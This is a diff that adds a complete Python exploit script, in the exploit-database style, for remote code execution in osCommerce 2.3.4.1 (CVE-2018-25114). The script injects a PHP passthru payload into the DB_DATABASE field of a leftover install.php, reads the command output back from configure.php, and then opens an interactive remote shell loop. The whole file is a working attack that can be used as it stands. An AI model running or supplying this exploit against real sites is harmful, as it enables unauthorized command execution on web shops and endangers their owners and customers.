@@ -1,0 +1,90 @@
+# Exploit Title: osCommerce 2.3.4.1 - Remote Code Execution CVE‑2018‑25114
+# Vulnerability: Remote Command Execution when /install directory wasn't removed by the admin
+# Exploit: Exploiting the install.php finish process by injecting php payload into the db_database parameter & read the system command output from configure.php
+# Date: 26/06/2021
+# Vendor Homepage: https://www.oscommerce.com/
+# Version: osCommerce 2.3.4
+# Tested on: Windows / Linux
+# -*- coding: utf-8 -*-
+import requests
+import sys
+
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+
+def main():
+    if len(sys.argv) != 2:
+        print("please specify the osCommerce url")
+        print("format: python3 osCommerce2_3_4RCE.py <url>")
+        print("eg: python3 osCommerce2_3_4RCE.py http://localhost/oscommerce-2.3.4/catalog")
+        sys.exit(1)
+
+    baseUrl = sys.argv[1].rstrip("/")
+    testVulnUrl = baseUrl + '/install/install.php'
+
+    def rce(command):
+        targetUrl = baseUrl + '/install/install.php?step=4'
+        payload = "');"
+        payload += f"passthru('{command}');"
+        payload += "/*"
+
+        data = {
+            'DIR_FS_DOCUMENT_ROOT': './',
+            'DB_DATABASE': payload
+        }
+        try:
+            response = requests.post(targetUrl, data=data, timeout=10, verify=False)
+        except Exception as e:
+            return f"[!] Request error: {str(e)}"
+
+        if response.status_code == 200:
+            readCMDUrl = baseUrl + '/install/includes/configure.php'
+            try:
+                cmd = requests.get(readCMDUrl, timeout=10, verify=False)
+            except Exception as e:
+                return f"[!] Read configure.php error: {str(e)}"
+
+            if cmd.status_code == 200:
+                commandRsl = cmd.text.splitlines()
+                output_lines = commandRsl[2:]
+                for line in output_lines:
+                    print(line)
+                return None
+            else:
+                return '[!] Configure.php not found'
+        else:
+            return '[!] Fail to inject payload'
+
+    try:
+        test = requests.get(testVulnUrl, timeout=10, verify=False)
+    except Exception as e:
+        print(f"[!] Cannot connect target: {str(e)}")
+        sys.exit(1)
+
+    if test.status_code == 200:
+        print('[*] Install directory still available, the host likely vulnerable to the exploit.')
+        print('[*] Testing injecting system command to test vulnerability')
+        cmd = 'whoami'
+        print('User: ', end='')
+        err = rce(cmd)
+        if err is not None:
+            print(err)
+            sys.exit(0)
+        while True:
+            try:
+                cmd = input('RCE_SHELL$ ')
+            except KeyboardInterrupt:
+                print("\n[*] Exit shell")
+                sys.exit(0)
+            err = rce(cmd)
+            if err is not None:
+                print(err)
+                sys.exit(0)
+    else:
+        print('[!] Install directory not found, the host is not vulnerable')
+        sys.exit(0)
+
+
+if __name__ == "__main__":
+    main()
